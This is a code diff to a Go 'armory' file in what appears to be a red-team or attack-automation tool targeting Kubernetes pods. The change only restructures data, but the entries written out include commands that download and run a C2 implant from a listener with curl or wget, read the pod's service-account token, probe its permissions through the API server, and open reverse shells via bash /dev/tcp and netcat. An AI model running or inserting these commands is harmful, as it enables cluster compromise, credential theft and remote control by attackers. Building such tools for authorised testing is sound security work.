@@ -88,7 +88,7 @@ func LoadArmory(dir string) (Armory, error) {
 			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
 			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP},
 			// Port:        1337,
-			CmdVariants: map[string]domain.CmdVariant{},
+			CmdVariants: []domain.CmdVariant{},
 			// Effects: c2.ListenerReady{},
 		},
 		{
@@ -104,9 +104,9 @@ func LoadArmory(dir string) (Armory, error) {
 			Tactics:     []domain.Tactic{domain.Execution},
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
 			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
-			CmdVariants: map[string]domain.CmdVariant{
-				"curl": `sh -c "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`,
-				"wget": "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &",
+			CmdVariants: []domain.CmdVariant{
+				{Key: "curl", Command: `sh -c "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
+				{Key: "wget", Command: "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"},
 			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
@@ -114,9 +114,9 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:        "Read SerivceAccount Token",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
 			Tactics:     []domain.Tactic{domain.CredentialAccess},
-			CmdVariants: map[string]domain.CmdVariant{
-				"":       "cat",
-				"sliver": "get_file",
+			CmdVariants: []domain.CmdVariant{
+				{Key: "", Command: "cat"},
+				{Key: "sliver", Command: "get_file"},
 			},
 			Args:          map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
 			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
@@ -127,8 +127,8 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:     "Install kubectl",
 			Tactics:  []domain.Tactic{domain.Discovery},
 			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
-			CmdVariants: map[string]domain.CmdVariant{
-				"curl": `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl`,
+			CmdVariants: []domain.CmdVariant{
+				{Key: "curl", Command: `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl`},
 			},
 		},
 
@@ -136,12 +136,12 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:     "Check Token permissions",
 			Tactics:  []domain.Tactic{domain.Discovery},
 			Requires: domain.Requirements{Kind: "ServiceAccount"},
-			CmdVariants: map[string]domain.CmdVariant{
+			CmdVariants: []domain.CmdVariant{
 				// "kubectl":           "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS}",
 				// "kubectl_remote_sa": "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS} --as=system:serviceaccount:${NS}:${SA.NAME}",
 				// -H "application/vnd.kubernetes.protobuf,application/json"
 				//	-H "Impersonate-User: system:serviceaccount:${NS}:${SA_NAME}"   <- for "external" checks; requires impersonation RBAC permissions
-				"curl": `curl -XPOST
+				{Key: "curl", Command: `curl -XPOST
 					${API_SERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
 					--cacert ${CA_PATH}
 					-H "Authorization: Bearer ${TOKEN}"
@@ -150,16 +150,19 @@ func LoadArmory(dir string) (Armory, error) {
 						"kind": "SelfSubjectRulesReview",
 						"apiVersion": "authorization.k8s.io/v1",
 						"spec": { "namespace": "${NS}" }
-					}'`,
+					}'`},
 			},
 			ResultHandler: handleSelfSubjectReviewResult,
 		},
 		{
-			Name:        "Start Netcat shell",
-			Description: "Establish a simple shell using netcat",
+			Name:        "Start reverse shell",
+			Description: "Establish a simple shell",
 			Tactics:     []domain.Tactic{domain.Execution},
-			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
-			Requires:    domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
+			CmdVariants: []domain.CmdVariant{
+				{Key: "bash", Command: "sh -i >& /dev/tcp/$LISTENER/$LISTENER_PORT 0>&1 &"},
+				{Key: "nc", Command: "nc $LISTENER $LISTENER_PORT -e /bin/sh &"},
+			},
+			Requires: domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
 		},
 		{
 			Name:          "Read Environment Variables",
